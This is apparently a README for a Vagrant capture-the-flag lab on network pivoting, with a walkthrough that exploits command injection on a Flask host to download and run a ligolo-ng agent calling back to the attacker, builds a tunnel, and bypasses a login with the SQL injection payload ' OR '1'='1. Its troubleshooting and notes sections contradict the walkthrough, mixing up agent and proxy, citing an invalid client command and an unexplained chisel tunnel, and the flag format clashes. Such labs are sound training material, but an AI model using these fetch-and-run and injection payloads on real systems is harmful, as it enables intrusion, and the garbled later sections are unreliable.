# Pivoting & Tunneling CTF Lab

This Vagrant lab includes three Debian Bookworm VMs:

- `attacker` — entry point and pivoting lab host
- `pivot` — vulnerable Flask app with command injection on `/cmd?cmd=` and an internal admin-style landing page at `/`
- `target` — vulnerable Flask app with SQL injection login bypass and a secret flag stored in SQLite

## Requirements

- Vagrant installed
- VirtualBox or another supported Vagrant provider
- Internet access for initial box download

## Start the lab

From the project root:

```bash
vagrant up attacker pivot target
```

Then SSH into the attacker VM:

```bash
vagrant ssh attacker
```

## Lab topology

- `attacker` IP: `192.168.56.10`
- `pivot` IP: `192.168.56.20` (attacker-facing)
- `pivot` IP: `192.168.57.20` (target-facing)
- `target` IP: `192.168.57.30`

The attacker machine is the only VM you use directly. The pivot host has access to the private target network, while the target is not reachable directly from attacker.

## Walkthrough

### 0) Verify the network is isolated

The `target` host should **not** be reachable directly from `attacker` (the `192.168.57.0/24` network is isolated between `pivot` and `target`).

From the attacker VM:

```bash
curl -m 3 -v http://192.168.57.30:5000/login
```

This should fail/time out. If it succeeds, rebuild so the network settings apply:

```bash
vagrant destroy -f pivot target attacker
vagrant up attacker pivot target
```

### 1) Confirm the pivot app

From the attacker VM, fetch the pivot landing page:

```bash
curl http://192.168.56.20:5000/
```

This page is a fake internal admin panel and proves that the pivot host is running a web service.

### 2) Find command injection and start ligolo-ng server

The vulnerable route is:

```bash
http://192.168.56.20:5000/cmd?cmd=<command>
```

Try a simple command first:

```bash
curl "http://192.168.56.20:5000/cmd?cmd=hostname"
```

Now exploit it to run a ligolo-ng **agent** on the pivot and connect it back to a ligolo-ng **proxy** on the attacker. The lab intentionally does not preinstall the agent so you must use the Flask command-injection to fetch and run it on `pivot`.

There are two common approaches:

- Option A — download ligolo-ng from a public release on the internet (replace `<..._URL>` below with the correct URL for your architecture):

```bash
curl "http://192.168.56.20:5000/cmd?cmd=wget%20-O%20%2Ftmp%2Fagent.tgz%20%3CLIGOLO_AGENT_TGZ_URL%3E%20%26%26%20cd%20%2Ftmp%20%26%26%20tar%20-xzf%20agent.tgz%20%26%26%20chmod%20%2Bx%20agent%20%26%26%20%2Ftmp%2Fagent%20-connect%20192.168.56.10%3A11601%20-ignore-cert%20%26"
```

- Option B — host the ligolo-ng `agent` binary from the attacker machine (e.g. `python3 -m http.server`) and pull it from pivot using the command injection endpoint.

This is the most reliable approach for the lab because it avoids hunting for the correct release URL mid-exploit.

#### 2a) Download ligolo-ng proxy + agent on attacker (GitHub Releases)

```bash
vagrant ssh attacker
mkdir -p ~/ligolo && cd ~/ligolo

# Find the correct downloads for your attacker architecture (this lab uses x86_64/amd64)
uname -m
curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url

# Recommended: automatically pick the *latest* Linux amd64 URLs from the GitHub API:
PROXY_URL="$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'proxy' | head -n 1 | cut -d '\"' -f 4)"
AGENT_URL="$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep browser_download_url | grep 'linux_amd64' | grep 'agent' | head -n 1 | cut -d '\"' -f 4)"
echo "$PROXY_URL"
echo "$AGENT_URL"

curl -L -o proxy.tgz "$PROXY_URL"
curl -L -o agent.tgz "$AGENT_URL"
tar -xzf proxy.tgz
tar -xzf agent.tgz
chmod +x proxy agent

# Sanity check: proxy/agent should be Linux ELF binaries (if you see "ASCII text", you downloaded the wrong asset)
file proxy agent
```

#### 2b) Start ligolo-ng proxy on attacker

```bash
cd ~/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

Leave that running (you will use its interactive console).

#### 2c) Host the `agent` binary on attacker and fetch it onto pivot via `/cmd`

In a second attacker terminal:

```bash
cd ~/ligolo
python3 -m http.server 8000 --bind 0.0.0.0
```

Now use the pivot command injection to download and run the agent on pivot (this output will be shown back to you via HTTP, but the agent runs on pivot):

```bash
# download agent to pivot
curl -sG --data-urlencode "cmd=wget -O /tmp/agent http://192.168.56.10:8000/agent && chmod +x /tmp/agent" \
  http://192.168.56.20:5000/cmd

# connect pivot agent back to attacker proxy (run in background)
curl -sG --data-urlencode "cmd=/tmp/agent -connect 192.168.56.10:11601 -ignore-cert &" \
  http://192.168.56.20:5000/cmd
```

### 3) Start the ligolo-ng tunnel and add a route

The target host is on a separate private network only reachable from pivot.

In the ligolo-ng proxy console (the first attacker terminal), you should now see a session connected. Select it and bring up a TUN interface:

```text
session
# select the pivot session

interface_create --name pivot0
tunnel_start --tun pivot0
interface_add_route --name pivot0 --route 192.168.57.0/24
```

The tunnel is now established. Verify the tunnel is working by accessing the target directly by its private IP (it will route through the ligolo TUN):

```bash
vagrant@attacker:~$ curl http://192.168.57.30:5000/login
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Internal Target Login</title>
  ...
</head>
<body>
  <h1>Internal Target Login</h1>
  <p>Enter your internal credentials to continue.</p>
  <form method="post" action="/login">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>
```

Success! The tunnel is working and you've reached the target's login form.

### 4) Exploit SQL injection on target login

The target login form is intentionally vulnerable. The SQL query is built unsafely:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Bypass authentication using SQL injection:

```bash
vagrant@attacker:~$ curl -X POST -d "username=' OR '1'='1&password=' OR '1'='1" http://192.168.57.30:5000/login
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Target Dashboard</title>
  <style>body{font-family:Arial,sans-serif;background:#f8fafc;color:#111827;padding:2rem;}pre{background:#e2e8f0;padding:1rem;border-radius:8px;overflow-x:auto;}section{max-width:720px;margin:auto;}</style>
</head>
<body>
  <section>
    <h1>Welcome, </h1>
    <p>Your internal dashboard has loaded successfully.</p>
    <h2>Secure Message</h2>
    <pre>CTF{pivot_master_2024}</pre>
  </section>
</body>
</html>
```

The SQL injection payload (`' OR '1'='1`) successfully bypasses the authentication check and grants access to the dashboard.

### 5) Flag captured

The target dashboard displays the secret flag — in this lab the flag is labeled the "tehf" flag. After you bypass the login using SQL injection the dashboard or secure message section will show the flag value.

Example (the page will include a block with the flag):

```text
TEHF{your_target_flag_here}
```

**Lab complete!** You have successfully:

1. Accessed the pivot VM and discovered the command injection vulnerability
2. Used the Flask command-injection to install and run the ligolo-ng server on the pivot
3. Tunneled through the compromised pivot to access the isolated target network using the ligolo-ng client
4. Exploited SQL injection on the target's login form
5. Retrieved the `tehf` flag from the target dashboard

## Troubleshooting

### I can reach `target` directly from `attacker`

You should **not** be able to reach `192.168.57.30` directly from the attacker VM. The `192.168.57.0/24` network is configured as a VirtualBox **internal network** shared only between `pivot` and `target`.

If you can reach it, rebuild the VMs so the new network config applies:

```bash
vagrant destroy -f pivot target attacker
vagrant up attacker pivot target
```

### ligolo-ng tunnel is not connecting

First, verify you successfully fetched and started the ligolo-ng server on pivot via the command injection endpoint (check for the process or that the server port is listening on pivot).

Example to check port from attacker:

```bash
nc -zv 192.168.56.10 11601
```

If you see "Connection refused", the ligolo-ng proxy isn't running on attacker, or the agent isn't connecting back.

On attacker, run the ligolo-ng client:

```bash
/usr/local/bin/ligolo-ng client 192.168.56.20:8080 5001:192.168.57.30:5000
```

The client should indicate the tunnel is established and continue running. Keep it running in one terminal and use another to test the tunnel.

### Target is not directly reachable from attacker

This is by design. The target only exists on `192.168.57.30` which is isolated on the private target network. Always use the chisel tunnel to access it via `localhost:5001`.

### Verify the private network works directly from pivot

To confirm the target is reachable from pivot (without the tunnel), SSH into pivot:

```bash
vagrant ssh pivot
curl http://192.168.57.30:5000/login
```

This will work immediately because pivot is on both networks.

## Notes

- The target user exists as `admin` / `supersecret`, but the intended beginner path is SQL injection bypass.
- The pivot route is intentionally dangerous because it uses `subprocess.check_output` with `shell=True`.
- Use the attacker VM as the entry point, then pivot to the internal services on `192.168.56.20` and the private target network via chisel.
